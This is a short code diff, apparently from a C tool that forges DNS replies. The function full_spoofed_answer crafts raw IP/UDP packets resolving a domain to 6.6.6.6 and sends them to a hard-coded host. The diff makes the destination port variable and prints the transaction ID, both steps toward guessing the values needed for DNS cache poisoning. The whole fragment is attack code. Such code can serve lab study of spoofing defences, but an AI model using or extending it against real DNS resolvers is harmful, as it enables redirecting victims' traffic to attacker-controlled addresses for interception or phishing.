@@ -83,7 +83,7 @@ int full_spoofed_answer(uint txid, uint d_port) {
     char *resolved_ip = "6.6.6.6";
 
     dest.sin_family = AF_INET;
-    dest.sin_port = htons(53);                // Destination port
+    dest.sin_port = htons(port);                // Destination port
     dest.sin_addr.s_addr = inet_addr("192.168.1.203"); // Destination IP
 
     // Fill IP header
@@ -94,6 +94,7 @@ int full_spoofed_answer(uint txid, uint d_port) {
                          sizeof(struct dns_header) + strlen(domain) + 2 + sizeof(struct dns_question) +
                          sizeof(struct dns_rr));
     iph->id = htonl(54321);
+    printf("txid: %u\n", txid);
     iph->frag_off = 0;
     iph->ttl = 255;
     iph->protocol = IPPROTO_UDP;
